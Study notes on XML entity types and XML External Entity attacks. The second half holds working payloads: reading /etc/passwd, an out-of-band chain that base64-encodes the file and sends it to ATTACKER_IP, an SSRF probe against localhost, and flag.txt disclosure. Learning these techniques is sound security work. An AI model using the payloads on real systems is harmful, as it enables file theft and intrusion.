- type of entities : 
    - internal :
        - used to repeat data in the same document
        - example : inf is the internal entity 
            <!DOCTYPE note [
                <!ENTITY inf "This is a test.">
            ]>
            <note>
                    <info>&inf;</info>
            </note>

    - external : 
        - used to repeat data pulled from different url or different document
        example : ext is the external entity
            <!DOCTYPE note [
                <!ENTITY ext SYSTEM "http://example.com/external.dtd">
            ]>
            <note>
                    <info>&ext;</info>
            </note>
    - parameters : 
        - used to define reusable structures or include external DTD subsets
        - example : common is the parameter entity
            <!DOCTYPE note [
                <!ENTITY % common "CDATA">
                <!ELEMENT name (%common;)>
            ]>
            <note>
                    <name>John Doe</name>
            </note>
            
    - general : 
        - used to define reusable data that can be ised within the body of the document
        - example : author is the general entity
            <!DOCTYPE note [
                <!ENTITY author "John Doe">
            ]>
            <note>
                    <writer>&author;</writer>
            </note>
    
    - characters : 
        - used to represent reserved or special characters in XML
        - examples : 
            - &lt; : for "<"
            - &gt; : for ">"
            - &amp; : for "&"

- techniques : 
    - in-band : 
        - example : 
            <!DOCTYPE foo [
                <!ENTITY xxe SYSTEM "file:///etc/passwd" >
            ]>
            <contact>
                <name>&xxe;</name>
                <email>test@test.com</email>
                <message>test</message>
            </contact>
        - result : 

    - out-of-band : 
        - example : 
            - start a server on port 1337 : 
                python -m http.server 1337
            - check for the existence of xxe : 
                <!DOCTYPE foo [
                    <!ELEMENT foo ANY >
                    <!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >
                ]>
                <upload><file>&xxe;</file></upload>

            - store DTD in the attaker machine  : 
                <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
                <!ENTITY % oobxxe 
                    "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>"
                >
                %oobxxe;
            
            - payload to send to the target : 
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
                <upload>
                    <file>&exfil;</file>
                </upload>

    - ssrf : 
        - example : 
            <!DOCTYPE foo [
                <!ELEMENT foo ANY >
                <!ENTITY xxe SYSTEM "http://localhost:<PORT>/" >
            ]>
            <contact>
                <name>&xxe;</name>
                <email>test@test.com</email>
                <message>test</message>
            </contact>

- payloads :
    - file discolures :
        1 - 
            <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "flag.txt" >]>
            <query>
                <search>vin</search>
                <country>&xxe;</country>
            </query>
        2 - 
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "flag.txt" >]>
            <query>
                <search>vin</search>
                <country>&xxe;</country>
            </query>